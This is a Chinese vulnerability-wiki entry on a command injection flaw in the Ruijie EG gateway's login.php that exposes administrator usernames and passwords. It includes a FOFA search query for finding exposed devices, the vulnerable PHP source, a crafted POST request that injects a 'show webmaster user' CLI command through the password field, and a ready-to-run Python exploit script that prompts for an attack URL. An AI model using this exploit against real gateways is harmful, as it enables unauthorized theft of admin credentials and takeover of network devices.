# 锐捷 EG易网关 管理员账号密码泄露漏洞

## 漏洞描述

锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露漏洞

## 漏洞影响

```
锐捷EG易网关
```

## 网络测绘

```
app="Ruijie-EG易网关"
```

## 漏洞复现

登录页面如下

![](images/202202110926402.png)

漏洞文件 login.php

```php
<?php

/**
 * 用户登录处理
 */
define('IN', true);     //定位该文件是入口文件
define('DS', DIRECTORY_SEPARATOR);
define('AROOT', dirname(__FILE__) . DS);

class defaultController {

    function __construct() {
        
    }

    /**
     * 登录处理
     */
    public function indexAction() {
$username = p("username");$password = p("password");$data = [];
$reg='/(\r|\n)+/';
if (count(preg_split($reg, $username)) > 1 || count(preg_split($reg, $password)) > 1) {
$data["status"] = 6;
$data["msg"] = "username or password can't exist '\r\n'";
json_echo($data);
exit();
}
        if ($username == FALSE || $password == FALSE) {
            $data["status"] = 5;
            $data["msg"] = "username or password can't empty";
            json_echo($data);
            exit();
        }
        $res = execCli("exec", "webmaster $username $password");
        if ($res["status"] != 1) {
            json_echo($res);
            exit();
        }
        $isSuccess = trim($res["data"]);
        if ($isSuccess == 0) {    //用户名、账号验证成功
            session_start();
            $_SESSION['username'] = $username;  //记录用户名
            $_SESSION["lasttime"] = time();    //记录登录时间
            $config = @file_get_contents(DS . "data" . DS . "web.config");    //获取web配置信息
            if ($config != false) {
                $config = unserialize($config);
                $_SESSION["timeout"] = isset($config["loginTimeout"]) ? $config["loginTimeout"] * 60 : c("timeout");
            } else {
                $_SESSION["timeout"] = c("timeout");
            }
            setcookie("user", $_SESSION['username']);
        }
        $res["data"] = $isSuccess;
        json_echo($res);
    }

    /**
     * 获取设备信息
     */
    function versionAction() {
        $info = $version = execCli("exec", "show version detail", "");
        $info["data"] = preg_split("/\r*\n/", $info["data"]);
        json_echo($info);
    }

}

include_once(AROOT . "init.php");    //mvc初始化入口，放在底部
```

关键代码部分

```plain
if ($username == FALSE || $password == FALSE) {
            $data["status"] = 5;
            $data["msg"] = "username or password can't empty";
            json_echo($data);
            exit();
        }
        $res = execCli("exec", "webmaster $username $password");
        if ($res["status"] != 1) {
            json_echo($res);
            exit();
        }
        $isSuccess = trim($res["data"]);
```

发送请求包，拼接 CLI指令 **show webmaster user**

```plain
POST /login.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

username=admin&password=admin?show+webmaster+user
```

![](images/202202110926492.png)

成功获取账号密码

## 漏洞POC

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 锐捷EG网关 管理员账号密码泄露                                      \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password=admin?show+webmaster+user'
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 show webmaster user \033[0m".format(target_url))
        if "data" in response.text and response.status_code == 200:
            print("\033[36m[o] 成功获取, 响应为:{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

#
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```